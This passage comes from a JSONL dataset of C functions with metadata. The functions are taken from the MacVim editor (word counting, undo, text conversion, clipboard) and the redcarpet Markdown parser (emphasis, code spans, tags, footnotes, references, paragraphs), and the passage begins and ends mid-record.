MAXCOL;\n\t\t/* Swap the start, end vcol if needed */\n\t\tif (oparg.end_vcol < oparg.start_vcol)\n\t\t{\n\t\t    oparg.end_vcol += oparg.start_vcol;\n\t\t    oparg.start_vcol = oparg.end_vcol - oparg.start_vcol;\n\t\t    oparg.end_vcol -= oparg.start_vcol;\n\t\t}\n\t    }\n\t    line_count_selected = max_pos.lnum - min_pos.lnum + 1;\n\t}\n\n\tfor (lnum = 1; lnum <= curbuf->b_ml.ml_line_count; ++lnum)\n\t{\n\t    /* Check for a CTRL-C every 100000 characters. */\n\t    if (byte_count > last_check)\n\t    {\n\t\tui_breakcheck();\n\t\tif (got_int)\n\t\t    return;\n\t\tlast_check = byte_count + 100000L;\n\t    }\n\n\t    /* Do extra processing for VIsual mode. */\n\t    if (VIsual_active\n\t\t    && lnum >= min_pos.lnum && lnum <= max_pos.lnum)\n\t    {\n\t\tchar_u\t    *s = NULL;\n\t\tlong\t    len = 0L;\n\n\t\tswitch (VIsual_mode)\n\t\t{\n\t\t    case Ctrl_V:\n#ifdef FEAT_VIRTUALEDIT\n\t\t\tvirtual_op = virtual_active();\n#endif\n\t\t\tblock_prep(&oparg, &bd, lnum, 0);\n#ifdef FEAT_VIRTUALEDIT\n\t\t\tvirtual_op = MAYBE;\n#endif\n\t\t\ts = bd.textstart;\n\t\t\tlen = (long)bd.textlen;\n\t\t\tbreak;\n\t\t    case 'V':\n\t\t\ts = ml_get(lnum);\n\t\t\tlen = MAXCOL;\n\t\t\tbreak;\n\t\t    case 'v':\n\t\t\t{\n\t\t\t    colnr_T start_col = (lnum == min_pos.lnum)\n\t\t\t\t\t\t\t   ? min_pos.col : 0;\n\t\t\t    colnr_T end_col = (lnum == max_pos.lnum)\n\t\t\t\t      ? max_pos.col - start_col + 1 : MAXCOL;\n\n\t\t\t    s = ml_get(lnum) + start_col;\n\t\t\t    len = end_col;\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tif (s != NULL)\n\t\t{\n\t\t    byte_count_cursor += line_count_info(s, &word_count_cursor,\n\t\t\t\t\t   &char_count_cursor, len, eol_size);\n\t\t    if (lnum == curbuf->b_ml.ml_line_count\n\t\t\t    && !curbuf->b_p_eol\n\t\t\t    && curbuf->b_p_bin\n\t\t\t    && (long)STRLEN(s) < len)\n\t\t\tbyte_count_cursor -= eol_size;\n\t\t}\n\t    }\n\t    else\n\t    {\n\t\t/* In non-visual mode, check for the line the cursor is on */\n\t\tif (lnum == curwin->w_cursor.lnum)\n\t\t{\n\t\t    word_count_cursor += word_count;\n\t\t    char_count_cursor += char_count;\n\t\t    byte_count_cursor = byte_count +\n\t\t\tline_count_info(ml_get(lnum),\n\t\t\t\t&word_count_cursor, &char_count_cursor,\n\t\t\t\t  (long)(curwin->w_cursor.col + 1), eol_size);\n\t\t}\n\t    }\n\t    /* Add to the running totals */\n\t    byte_count += line_count_info(ml_get(lnum), &word_count,\n\t\t\t\t\t &char_count, (long)MAXCOL, eol_size);\n\t}\n\n\t/* Correction for when last line doesn't have an EOL. */\n\tif (!curbuf->b_p_eol && curbuf->b_p_bin)\n\t    byte_count -= eol_size;\n\n\tif (VIsual_active)\n\t{\n\t    if (VIsual_mode == Ctrl_V && curwin->w_curswant < MAXCOL)\n\t    {\n\t\tgetvcols(curwin, &min_pos, &max_pos, &min_pos.col,\n\t\t\t\t\t\t\t\t&max_pos.col);\n\t\tvim_snprintf((char *)buf1, sizeof(buf1), _(\"%ld Cols; \"),\n\t\t\t(long)(oparg.end_vcol - oparg.start_vcol + 1));\n\t    }\n\t    else\n\t\tbuf1[0] = NUL;\n\n\t    if (char_count_cursor == byte_count_cursor\n\t\t\t\t\t\t  && char_count == byte_count)\n\t\tvim_snprintf((char *)IObuff, IOSIZE,\n\t\t\t_(\"Selected %s%ld of %ld Lines; %ld of %ld Words; %ld of %ld Bytes\"),\n\t\t\tbuf1, line_count_selected,\n\t\t\t(long)curbuf->b_ml.ml_line_count,\n\t\t\tword_count_cursor, word_count,\n\t\t\tbyte_count_cursor, byte_count);\n\t    else\n\t\tvim_snprintf((char *)IObuff, IOSIZE,\n\t\t\t_(\"Selected %s%ld of %ld Lines; %ld of %ld Words; %ld of %ld Chars; %ld of %ld Bytes\"),\n\t\t\tbuf1, line_count_selected,\n\t\t\t(long)curbuf->b_ml.ml_line_count,\n\t\t\tword_count_cursor, word_count,\n\t\t\tchar_count_cursor, char_count,\n\t\t\tbyte_count_cursor, byte_count);\n\t}\n\telse\n\t{\n\t    p = ml_get_curline();\n\t    validate_virtcol();\n\t    col_print(buf1, sizeof(buf1), (int)curwin->w_cursor.col + 1,\n\t\t    (int)curwin->w_virtcol + 1);\n\t    col_print(buf2, sizeof(buf2), (int)STRLEN(p),\n\t\t\t\tlinetabsize(p));\n\n\t    if (char_count_cursor == byte_count_cursor\n\t\t    && char_count == byte_count)\n\t\tvim_snprintf((char *)IObuff, IOSIZE,\n\t\t    _(\"Col %s of %s; Line %ld of %ld; Word %ld of %ld; Byte %ld of %ld\"),\n\t\t    (char *)buf1, (char *)buf2,\n\t\t    (long)curwin->w_cursor.lnum,\n\t\t    (long)curbuf->b_ml.ml_line_count,\n\t\t    word_count_cursor, word_count,\n\t\t    byte_count_cursor, byte_count);\n\t    else\n\t\tvim_snprintf((char *)IObuff, IOSIZE,\n\t\t    _(\"Col %s of %s; Line %ld of %ld; Word %ld of %ld; Char %ld of %ld; Byte %ld of %ld\"),\n\t\t    (char *)buf1, (char *)buf2,\n\t\t    (long)curwin->w_cursor.lnum,\n\t\t    (long)curbuf->b_ml.ml_line_count,\n\t\t    word_count_cursor, word_count,\n\t\t    char_count_cursor, char_count,\n\t\t    byte_count_cursor, byte_count);\n\t}\n\n#ifdef FEAT_MBYTE\n\tbyte_count = bomb_size();\n\tif (byte_count > 0)\n\t    sprintf((char *)IObuff + STRLEN(IObuff), _(\"(+%ld for BOM)\"),\n\t\t\t\t\t\t\t\t  byte_count);\n#endif\n\t/* Don't shorten this message, the user asked for it. */\n\tp = p_shm;\n\tp_shm = (char_u *)\"\";\n\tmsg(IObuff);\n\tp_shm = p;\n    }\n}", "path": "macvim/src/ops.c", "commit_date": "2014-06-25 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * u_getbot(): compute the line number of the previous u_save\n *\t\tIt is called only when b_u_synced is FALSE.\n */\n", "func_signal": "static void\nu_getbot()", "code": "{\n    u_entry_T\t*uep;\n    linenr_T\textra;\n\n    uep = u_get_headentry();\t/* check for corrupt undo list */\n    if (uep == NULL)\n\treturn;\n\n    uep = curbuf->b_u_newhead->uh_getbot_entry;\n    if (uep != NULL)\n    {\n\t/*\n\t * the new ue_bot is computed from the number of lines that has been\n\t * inserted (0 - deleted) since calling u_save. This is equal to the\n\t * old line count subtracted from the current line count.\n\t */\n\textra = curbuf->b_ml.ml_line_count - uep->ue_lcount;\n\tuep->ue_bot = uep->ue_top + uep->ue_size + 1 + extra;\n\tif (uep->ue_bot < 1 || uep->ue_bot > curbuf->b_ml.ml_line_count)\n\t{\n\t    EMSG(_(\"E440: undo line missing\"));\n\t    uep->ue_bot = uep->ue_top + 1;  /* assume all lines deleted, will\n\t\t\t\t\t     * get all the old lines back\n\t\t\t\t\t     * without deleting the current\n\t\t\t\t\t     * ones */\n\t}\n\n\tcurbuf->b_u_newhead->uh_getbot_entry = NULL;\n    }\n\n    curbuf->b_u_synced = TRUE;\n}", "path": "macvim/src/undo.c", "commit_date": "2014-04-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Initializes text converters\n */\n", "func_signal": "void\nmac_conv_init()", "code": "{\n    TextEncoding    utf8_encoding;\n    TextEncoding    utf8_hfsplus_encoding;\n    TextEncoding    utf8_canon_encoding;\n    TextEncoding    utf16_encoding;\n\n    utf8_encoding = CreateTextEncoding(kTextEncodingUnicodeDefault,\n\t    kTextEncodingDefaultVariant, kUnicodeUTF8Format);\n    utf8_hfsplus_encoding = CreateTextEncoding(kTextEncodingUnicodeDefault,\n\t    kUnicodeHFSPlusCompVariant, kUnicodeUTF8Format);\n    utf8_canon_encoding = CreateTextEncoding(kTextEncodingUnicodeDefault,\n\t    kUnicodeCanonicalCompVariant, kUnicodeUTF8Format);\n    utf16_encoding = CreateTextEncoding(kTextEncodingUnicodeDefault,\n\t    kTextEncodingDefaultVariant, kUnicode16BitFormat);\n\n    if (TECCreateConverter(&gPathConverter, utf8_encoding,\n\t\tutf8_hfsplus_encoding) != noErr)\n\tgPathConverter = NULL;\n\n    if (TECCreateConverter(&gUTF16ToUTF8Converter, utf16_encoding,\n\t\tutf8_canon_encoding) != noErr)\n    {\n\t/* On pre-10.3, Unicode normalization is not available so\n\t * fall back to non-normalizing converter */\n\tif (TECCreateConverter(&gUTF16ToUTF8Converter, utf16_encoding,\n\t\t    utf8_encoding) != noErr)\n\t    gUTF16ToUTF8Converter = NULL;\n    }\n}", "path": "macvim/src/os_mac_conv.c", "commit_date": "2011-10-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * If we have written to a clipboard register, send the text to the clipboard.\n */\n", "func_signal": "static void\nmay_set_selection()", "code": "{\n    if (y_current == &(y_regs[STAR_REGISTER]) && clip_star.available)\n    {\n\tclip_own_selection(&clip_star);\n\tclip_gen_set_selection(&clip_star);\n    }\n    else if (y_current == &(y_regs[PLUS_REGISTER]) && clip_plus.available)\n    {\n\tclip_own_selection(&clip_plus);\n\tclip_gen_set_selection(&clip_plus);\n    }\n}", "path": "macvim/src/ops.c", "commit_date": "2014-06-25 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Get the undolevle value for the current buffer.\n */\n", "func_signal": "static long\nget_undolevel()", "code": "{\n    if (curbuf->b_p_ul == NO_LOCAL_UNDOLEVEL)\n\treturn p_ul;\n    return curbuf->b_p_ul;\n}", "path": "macvim/src/undo.c", "commit_date": "2014-04-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * set all the yank registers to empty (called from main())\n */\n", "func_signal": "void\ninit_yank()", "code": "{\n    int\t\ti;\n\n    for (i = 0; i < NUM_REGISTERS; ++i)\n\ty_regs[i].y_array = NULL;\n}", "path": "macvim/src/ops.c", "commit_date": "2014-06-25 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Save the current line for both the \"u\" and \"U\" command.\n * Careful: may trigger autocommands that reload the buffer.\n * Returns OK or FAIL.\n */\n", "func_signal": "int\nu_save_cursor()", "code": "{\n    return (u_save((linenr_T)(curwin->w_cursor.lnum - 1),\n\t\t\t\t      (linenr_T)(curwin->w_cursor.lnum + 1)));\n}", "path": "macvim/src/undo.c", "commit_date": "2014-04-20 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/*\n * Get the '=' register expression itself, without evaluating it.\n */\n", "func_signal": "char_u *\nget_expr_line_src()", "code": "{\n    if (expr_line == NULL)\n\treturn NULL;\n    return vim_strsave(expr_line);\n}", "path": "macvim/src/ops.c", "commit_date": "2014-06-25 00:00:00", "repo_name": "b4winckler/macvim", "stars": 5107, "license": "None", "language": "c", "size": 78126}
{"docstring": "/* parse_footnote_def \u2022 parse a single footnote definition */\n", "func_signal": "static void\nparse_footnote_def(struct buf *ob, struct sd_markdown *rndr, unsigned int num, uint8_t *data, size_t size)", "code": "{\n\tstruct buf *work = 0;\n\twork = rndr_newbuf(rndr, BUFFER_SPAN);\n\n\tparse_block(work, rndr, data, size);\n\n\tif (rndr->cb.footnote_def)\n\trndr->cb.footnote_def(ob, work, num, rndr->opaque);\n\trndr_popbuf(rndr, BUFFER_SPAN);\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* parse_emph1 \u2022 parsing single emphase */\n/* closed by a symbol not preceded by whitespace and not followed by symbol */\n", "func_signal": "static size_t\nparse_emph1(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t size, uint8_t c)", "code": "{\n\tsize_t i = 0, len;\n\tstruct buf *work = 0;\n\tint r;\n\n\t/* skipping one symbol if coming from emph3 */\n\tif (size > 1 && data[0] == c && data[1] == c) i = 1;\n\n\twhile (i < size) {\n\t\tlen = find_emph_char(data + i, size - i, c);\n\t\tif (!len) return 0;\n\t\ti += len;\n\t\tif (i >= size) return 0;\n\n\t\tif (data[i] == c && !_isspace(data[i - 1])) {\n\n\t\t\tif (rndr->ext_flags & MKDEXT_NO_INTRA_EMPHASIS) {\n\t\t\t\tif (i + 1 < size && _isalnum(data[i + 1]))\n\t\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\twork = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\t\tparse_inline(work, rndr, data, i);\n\n\t\t\tif (rndr->ext_flags & MKDEXT_UNDERLINE && c == '_')\n\t\t\t\tr = rndr->cb.underline(ob, work, rndr->opaque);\n\t\t\telse\n\t\t\t\tr = rndr->cb.emphasis(ob, work, rndr->opaque);\n\n\t\t\trndr_popbuf(rndr, BUFFER_SPAN);\n\t\t\treturn r ? i + 1 : 0;\n\t\t}\n\t}\n\n\treturn 0;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "// Converts \"--\" to em-dash, etc.\n", "func_signal": "static size_t\nsmartypants_cb__dash(struct buf *ob, struct smartypants_data *smrt, uint8_t previous_char, const uint8_t *text, size_t size)", "code": "{\n\tif (size >= 3 && text[1] == '-' && text[2] == '-') {\n\t\tBUFPUTSL(ob, \"&mdash;\");\n\t\treturn 2;\n\t}\n\n\tif (size >= 2 && text[1] == '-') {\n\t\tBUFPUTSL(ob, \"&ndash;\");\n\t\treturn 1;\n\t}\n\n\tbufputc(ob, text[0]);\n\treturn 0;\n}", "path": "redcarpet/ext/redcarpet/html_smartypants.c", "commit_date": "2017-08-09 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* prefix_oli \u2022 returns ordered list item prefix */\n", "func_signal": "static size_t\nprefix_oli(uint8_t *data, size_t size)", "code": "{\n\tsize_t i = 0;\n\n\tif (i < size && data[i] == ' ') i++;\n\tif (i < size && data[i] == ' ') i++;\n\tif (i < size && data[i] == ' ') i++;\n\n\tif (i >= size || data[i] < '0' || data[i] > '9')\n\t\treturn 0;\n\n\twhile (i < size && data[i] >= '0' && data[i] <= '9')\n\t\ti++;\n\n\tif (i + 1 >= size || data[i] != '.' || data[i + 1] != ' ')\n\t\treturn 0;\n\n\tif (is_next_headerline(data + i, size - i))\n\t\treturn 0;\n\n\treturn i + 2;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* char_codespan \u2022 '`' parsing a code span (assuming codespan != 0) */\n", "func_signal": "static size_t\nchar_codespan(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t offset, size_t size)", "code": "{\n\tsize_t end, nb = 0, i, f_begin, f_end;\n\n\t/* counting the number of backticks in the delimiter */\n\twhile (nb < size && data[nb] == '`')\n\t\tnb++;\n\n\t/* finding the next delimiter */\n\ti = 0;\n\tfor (end = nb; end < size && i < nb; end++) {\n\t\tif (data[end] == '`') i++;\n\t\telse i = 0;\n\t}\n\n\tif (i < nb && end >= size)\n\t\treturn 0; /* no matching delimiter */\n\n\t/* trimming outside whitespaces */\n\tf_begin = nb;\n\twhile (f_begin < end && data[f_begin] == ' ')\n\t\tf_begin++;\n\n\tf_end = end - nb;\n\twhile (f_end > nb && data[f_end-1] == ' ')\n\t\tf_end--;\n\n\t/* real code span */\n\tif (f_begin < f_end) {\n\t\tstruct buf work = { data + f_begin, f_end - f_begin, 0, 0 };\n\t\tif (!rndr->cb.codespan(ob, &work, rndr->opaque))\n\t\t\tend = 0;\n\t} else {\n\t\tif (!rndr->cb.codespan(ob, 0, rndr->opaque))\n\t\t\tend = 0;\n\t}\n\n\treturn end;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* char_langle_tag \u2022 '<' when tags or autolinks are allowed */\n", "func_signal": "static size_t\nchar_langle_tag(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t offset, size_t size)", "code": "{\n\tenum mkd_autolink altype = MKDA_NOT_AUTOLINK;\n\tsize_t end = tag_length(data, size, &altype);\n\tstruct buf work = { data, end, 0, 0 };\n\tint ret = 0;\n\n\tif (end > 2) {\n\t\tif (rndr->cb.autolink && altype != MKDA_NOT_AUTOLINK) {\n\t\t\tstruct buf *u_link = rndr_newbuf(rndr, BUFFER_SPAN);\n\t\t\twork.data = data + 1;\n\t\t\twork.size = end - 2;\n\t\t\tunscape_text(u_link, &work);\n\t\t\tret = rndr->cb.autolink(ob, u_link, altype, rndr->opaque);\n\t\t\trndr_popbuf(rndr, BUFFER_SPAN);\n\t\t}\n\t\telse if (rndr->cb.raw_html_tag)\n\t\t\tret = rndr->cb.raw_html_tag(ob, &work, rndr->opaque);\n\t}\n\n\tif (!ret) return 0;\n\telse return end;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* bufputc: appends a single uint8_t to a buffer */\n", "func_signal": "void\nbufputc(struct buf *buf, int c)", "code": "{\n\tassert(buf && buf->unit);\n\n\tif (buf->size + 1 > buf->asize && bufgrow(buf, buf->size + 1) < BUF_OK)\n\t\treturn;\n\n\tbuf->data[buf->size] = c;\n\tbuf->size += 1;\n}", "path": "redcarpet/ext/redcarpet/buffer.c", "commit_date": "2015-12-07 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* tag_length \u2022 returns the length of the given tag, or 0 is it's not valid */\n", "func_signal": "static size_t\ntag_length(uint8_t *data, size_t size, enum mkd_autolink *autolink)", "code": "{\n\tsize_t i, j;\n\n\t/* a valid tag can't be shorter than 3 chars */\n\tif (size < 3) return 0;\n\n\t/* begins with a '<' optionally followed by '/', followed by letter or number */\n\tif (data[0] != '<') return 0;\n\ti = (data[1] == '/') ? 2 : 1;\n\n\tif (!_isalnum(data[i]))\n\t\treturn 0;\n\n\t/* scheme test */\n\t*autolink = MKDA_NOT_AUTOLINK;\n\n\t/* try to find the beginning of an URI */\n\twhile (i < size && (_isalnum(data[i]) || data[i] == '.' || data[i] == '+' || data[i] == '-'))\n\t\ti++;\n\n\tif (i > 1 && data[i] == '@') {\n\t\tif ((j = is_mail_autolink(data + i, size - i)) != 0) {\n\t\t\t*autolink = MKDA_EMAIL;\n\t\t\treturn i + j;\n\t\t}\n\t}\n\n\tif (i > 2 && data[i] == ':') {\n\t\t*autolink = MKDA_NORMAL;\n\t\ti++;\n\t}\n\n\t/* completing autolink test: no whitespace or ' or \" */\n\tif (i >= size)\n\t\t*autolink = MKDA_NOT_AUTOLINK;\n\n\telse if (*autolink) {\n\t\tj = i;\n\n\t\twhile (i < size) {\n\t\t\tif (data[i] == '\\\\') i += 2;\n\t\t\telse if (data[i] == '>' || data[i] == '\\'' ||\n\t\t\t\t\tdata[i] == '\"' || data[i] == ' ' || data[i] == '\\n')\n\t\t\t\t\tbreak;\n\t\t\telse i++;\n\t\t}\n\n\t\tif (i >= size) return 0;\n\t\tif (i > j && data[i] == '>') return i + 1;\n\t\t/* one of the forbidden chars has been found */\n\t\t*autolink = MKDA_NOT_AUTOLINK;\n\t}\n\n\t/* looking for sometinhg looking like a tag end */\n\twhile (i < size && data[i] != '>') i++;\n\tif (i >= size) return 0;\n\treturn i + 1;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "// Converts `` to opening double quote\n", "func_signal": "static size_t\nsmartypants_cb__backtick(struct buf *ob, struct smartypants_data *smrt, uint8_t previous_char, const uint8_t *text, size_t size)", "code": "{\n\tif (size >= 2 && text[1] == '`') {\n\t\tif (smartypants_quotes(ob, previous_char, size >= 3 ? text[2] : 0, 'd', &smrt->in_dquote))\n\t\t\treturn 1;\n\t}\n\n\tbufputc(ob, text[0]);\n\treturn 0;\n}", "path": "redcarpet/ext/redcarpet/html_smartypants.c", "commit_date": "2017-08-09 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "// Converts 1/2, 1/4, 3/4\n", "func_signal": "static size_t\nsmartypants_cb__number(struct buf *ob, struct smartypants_data *smrt, uint8_t previous_char, const uint8_t *text, size_t size)", "code": "{\n\tif (fraction_boundary(previous_char) && size >= 3) {\n\t\tif (text[0] == '1' && text[1] == '/' && text[2] == '2') {\n\t\t\tif (size == 3 || fraction_boundary(text[3])) {\n\t\t\t\tBUFPUTSL(ob, \"&frac12;\");\n\t\t\t\treturn 2;\n\t\t\t}\n\t\t}\n\n\t\tif (text[0] == '1' && text[1] == '/' && text[2] == '4') {\n\t\t\tif (size == 3 || fraction_boundary(text[3]) ||\n\t\t\t\t(size >= 5 && tolower(text[3]) == 't' && tolower(text[4]) == 'h')) {\n\t\t\t\tBUFPUTSL(ob, \"&frac14;\");\n\t\t\t\treturn 2;\n\t\t\t}\n\t\t}\n\n\t\tif (text[0] == '3' && text[1] == '/' && text[2] == '4') {\n\t\t\tif (size == 3 || fraction_boundary(text[3]) ||\n\t\t\t\t(size >= 6 && tolower(text[3]) == 't' && tolower(text[4]) == 'h' && tolower(text[5]) == 's')) {\n\t\t\t\tBUFPUTSL(ob, \"&frac34;\");\n\t\t\t\treturn 2;\n\t\t\t}\n\t\t}\n\t}\n\n\tbufputc(ob, text[0]);\n\treturn 0;\n}", "path": "redcarpet/ext/redcarpet/html_smartypants.c", "commit_date": "2017-08-09 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* is_ref \u2022 returns whether a line is a reference or not */\n", "func_signal": "static int\nis_ref(const uint8_t *data, size_t beg, size_t end, size_t *last, struct link_ref **refs)", "code": "{\n/*\tint n; */\n\tsize_t i = 0;\n\tsize_t id_offset, id_end;\n\tsize_t link_offset, link_end;\n\tsize_t title_offset, title_end;\n\tsize_t line_end;\n\n\t/* up to 3 optional leading spaces */\n\tif (beg + 3 >= end) return 0;\n\tif (data[beg] == ' ') { i = 1;\n\tif (data[beg + 1] == ' ') { i = 2;\n\tif (data[beg + 2] == ' ') { i = 3;\n\tif (data[beg + 3] == ' ') return 0; } } }\n\ti += beg;\n\n\t/* id part: anything but a newline between brackets */\n\tif (data[i] != '[') return 0;\n\ti++;\n\tid_offset = i;\n\twhile (i < end && data[i] != '\\n' && data[i] != '\\r' && data[i] != ']')\n\t\ti++;\n\tif (i >= end || data[i] != ']') return 0;\n\tid_end = i;\n\n\t/* spacer: colon (space | tab)* newline? (space | tab)* */\n\ti++;\n\tif (i >= end || data[i] != ':') return 0;\n\ti++;\n\twhile (i < end && strchr(\"\\t \", data[i])) i++;\n\tif (i < end && (data[i] == '\\n' || data[i] == '\\r')) {\n\t\ti++;\n\t\tif (i < end && data[i] == '\\r' && data[i - 1] == '\\n') i++; }\n\twhile (i < end && strchr(\"\\t \", data[i])) i++;\n\tif (i >= end) return 0;\n\n\t/* link: whitespace-free sequence, optionally between angle brackets */\n\tif (data[i] == '<')\n\t\ti++;\n\n\tlink_offset = i;\n\n\twhile (i < end && data[i] != ' ' && data[i] != '\\n' && data[i] != '\\r')\n\t\ti++;\n\n\tif (data[i - 1] == '>') link_end = i - 1;\n\telse link_end = i;\n\n\t/* optional spacer: (space | tab)* (newline | '\\'' | '\"' | '(' ) */\n\twhile (i < end && strchr(\"\\t \", data[i])) i++;\n\tif (i < end && data[i] != '\\n' && data[i] != '\\r'\n\t\t\t&& data[i] != '\\'' && data[i] != '\"' && data[i] != '(')\n\t\treturn 0;\n\tline_end = 0;\n\t/* computing end-of-line */\n\tif (i >= end || data[i] == '\\r' || data[i] == '\\n') line_end = i;\n\tif (i + 1 < end && data[i] == '\\n' && data[i + 1] == '\\r')\n\t\tline_end = i + 1;\n\n\t/* optional (space|tab)* spacer after a newline */\n\tif (line_end) {\n\t\ti = line_end + 1;\n\t\twhile (i < end && strchr(\"\\t \", data[i])) i++; }\n\n\t/* optional title: any non-newline sequence enclosed in '\"()\n\t\t\t\t\talone on its line */\n\ttitle_offset = title_end = 0;\n\tif (i + 1 < end\n\t&& (data[i] == '\\'' || data[i] == '\"' || data[i] == '(')) {\n\t\ti++;\n\t\ttitle_offset = i;\n\t\t/* looking for EOL */\n\t\twhile (i < end && data[i] != '\\n' && data[i] != '\\r') i++;\n\t\tif (i + 1 < end && data[i] == '\\n' && data[i + 1] == '\\r')\n\t\t\ttitle_end = i + 1;\n\t\telse\ttitle_end = i;\n\t\t/* stepping back */\n\t\ti -= 1;\n\t\twhile (i > title_offset && data[i] == ' ')\n\t\t\ti -= 1;\n\t\tif (i > title_offset\n\t\t&& (data[i] == '\\'' || data[i] == '\"' || data[i] == ')')) {\n\t\t\tline_end = title_end;\n\t\t\ttitle_end = i; } }\n\n\tif (!line_end || link_end == link_offset)\n\t\treturn 0; /* garbage after the link empty link */\n\n\t/* a valid ref has been found, filling-in return structures */\n\tif (last)\n\t\t*last = line_end;\n\n\tif (refs) {\n\t\tstruct link_ref *ref;\n\n\t\tref = add_link_ref(refs, data + id_offset, id_end - id_offset);\n\t\tif (!ref)\n\t\t\treturn 0;\n\n\t\tref->link = bufnew(link_end - link_offset);\n\t\tbufput(ref->link, data + link_offset, link_end - link_offset);\n\n\t\tif (title_end > title_offset) {\n\t\t\tref->title = bufnew(title_end - title_offset);\n\t\t\tbufput(ref->title, data + title_offset, title_end - title_offset);\n\t\t}\n\t}\n\n\treturn 1;\n}", "path": "redcarpet/ext/redcarpet/markdown.c", "commit_date": "2019-09-13 00:00:00", "repo_name": "vmg/redcarpet", "stars": 4931, "license": "mit", "language": "c", "size": 1121}
{"docstring": "/* parse_paragraph \u2022 handles parsing of a regular paragraph */\n", "func_signal": "static size_t\nparse_paragraph(struct buf *ob, struct sd_markdown *rndr, uint8_t *data, size_t size)", "code": "{\n\tsize_t i = 0, end = 0;\n\tint level = 0, last_is_empty = 1;\n\tstruct buf work = { data, 0, 0, 0 };\n\n\twhile (i < size) {\n\t\tfor (end = i + 1; end < size && data[end - 1] != '\\n'; end++) /* empty */;\n\n\t\tif (is_empty(data + i, size - i))\n\t\t\tbreak;\n\n\t\tif (!last_is_empty && (level = is_headerline(data + i, size - i)) != 0)\n\t\t\tbreak;\n\n\t\tlast_is_empty = 0;\n\n\t\tif (is_atxheader(rndr, data + i, size - i) ||\n\t\t\tis_hrule(data + i, size - i) ||\n\t\t\tprefix_quote(data + i, size - i)) {\n\t\t\tend = i;\n\t\t\tbreak;\n\t\t}\n\n\t\t/*\n\t\t * Early termination of a paragraph with the same logic\n\t\t * as Markdown 1.0.0. If this logic is applied, the\n\t\t * Markdown 1.0.3 test suite won't pass cleanly\n\t\t *\n\t\t * :: If the first character in a new line is not a letter,\n\t\t * let's check to see if there's some kind of block starting\n\t\t * here\n\t\t */\n\t\tif ((rndr->ext_flags & MKDEXT_LAX_SPACING) && !isalpha(data[i])) {\n\t\t\tif (prefix_oli(data + i, size - i) ||\n\t\t\t\tprefix_uli(data + i, size - i)) {\n\t\t\t\tend = i;\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\t/* see if an html block starts here */\n\t\t\tif (data[i] == '<' && rndr->cb.blockhtml &&\n\t\t\t\tparse_htmlblock(ob, rndr, data + i, size - i, 0)) {\n\t\t\t\tend = i;\n\t\t\t\tbreak;\n\t\t\t}\n\n\t\t\t/* see if a code fence starts here */\n\t\t\tif ((rndr->ext_flags & MKDEXT_FENCED_CODE) != 0 &&\n\t\t\t\tis_codefence(data + i, size - i, NULL, NULL) != 0) {\n\t\t\t\tend = i;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\t\ti = end;\n\t}\n\n\twork.size = i;\n\twhile (work.size && data[work.size - 1] == '\\n')\n\t\twork.size--;\n\n\tif (!level) {\n\t\tstruct buf *tmp = rndr_newbuf(rndr, BUFFER_BLOCK);\n\t\tparse_inline(tmp, rndr, work.data, work.size);\n\t\tif (rndr->cb.paragraph)\n\t\t\trndr->cb.paragraph(ob, tmp, rndr->opaque);\n\t\trndr_popbuf(rndr, BUFFER_BLOCK);\n\t} else {\n\t\tstruct buf *header_work;\n\n\t\tif (work.size) {\n\t\t\tsize_t beg;\n\t\t\ti = work.size;\n\t\t\twork.size -= 1;\n\n\t\t\twhile (work.size && data[work.size] != '\\n')\n\t\t\t\twork.size -= 1;\n\n\t\t\tbeg = work.size + 1;\n\t\t\twhile (work.size && data[work.size - 1] == '\\n')\n\t\t\t\twork.size -= 1;\n\n\t\t\tif (work.size > 0) {\n\t\t\t\tstruct buf *tmp = rndr_newbuf(rndr, 